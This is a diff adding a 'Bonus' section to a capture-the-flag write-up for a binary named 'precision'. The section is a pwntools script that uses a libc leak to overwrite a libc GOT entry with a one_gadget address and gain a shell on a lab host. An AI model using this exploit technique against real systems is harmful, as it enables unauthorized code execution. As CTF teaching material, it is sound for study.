@@ -133,6 +133,46 @@ r.send(p64(libc_base + 0xebcf8))
 r.interactive()
 ```
 
+## Bonus
+
+Another solution to call the one gadget without meet the constraints (only works on remote).
+
+```py
+from pwn import *
+
+binary = './precision'
+
+context.log_level = 'debug'
+context.binary = binary
+
+e = ELF(binary)
+# r = process(binary)
+r = remote('10.10.39.142', 9004)
+libc = ELF('./libc.so.6')
+
+r.recvuntil(b'Coordinates: ')
+leak = r.recvline().strip()
+leak = int(leak, 16)
+log.info(f'Leak: {hex(leak)}')
+libc_base = leak - libc.symbols['_IO_2_1_stdout_']
+log.info(f'Libc base: {hex(libc_base)}')
+
+libc.address = libc_base
+
+one_gadget = libc_base + 0x10DBCA
+got = libc_base + (0x7ffff7fac0b8 - 0x7ffff7d93000)
+
+r.sendlineafter(b'>> ', str(got).encode())
+r.send(p64(one_gadget))
+
+r.sendlineafter(b'>> ', str(got).encode())
+r.send(p64(one_gadget))
+
+r.sendline(b'cat flag.txt') 
+
+r.interactive()
+```
+
 ## References
 
 - [Code execution with a write primitive on last libc.](https://github.com/nobodyisnobody/docs/tree/6960bfb204f0cfe844d75809412b0f79313f105d/code.execution.on.last.libc)
